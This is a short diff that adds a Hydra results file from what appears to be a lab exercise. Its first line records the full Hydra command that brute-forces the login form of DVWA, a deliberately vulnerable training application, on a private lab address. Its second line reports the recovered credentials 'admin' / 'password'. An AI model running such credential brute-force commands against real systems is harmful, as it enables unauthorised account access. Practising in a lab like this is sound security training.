@@ -1,0 +1,2 @@
+# Hydra v9.7 run at 2026-11-24 15:07:19 on 192.168.56.103 http-post-form (hydra -l admin -P senhas.txt -o resultados-dvwa-hydra.txt 192.168.56.103 http-post-form /dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed)
+[80][http-post-form] host: 192.168.56.103   login: admin   password: password
